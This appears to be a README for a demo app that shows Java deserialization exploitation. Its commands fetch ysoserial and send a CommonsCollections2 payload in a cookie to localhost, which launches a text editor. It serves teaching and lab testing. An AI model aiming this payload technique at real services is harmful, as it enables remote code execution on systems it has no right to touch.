A simple example of Java Serialized Objects (JSO) 
exploitation.

To test

    $ wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
    $ mvn spring-boot:run
    $ curl -v http://localhost:8080/hello -H "Cookie: USER=$(java -jar ysoserial-master-55f1e7c35c-1.jar CommonsCollections2 leafpad | base64 -w 0)"

# References
 
 - [ysoserial](https://github.com/frohoff/ysoserial)
 - [A great article by rapid7](https://www.rapid7.com/research/report/exploiting-jsos/)
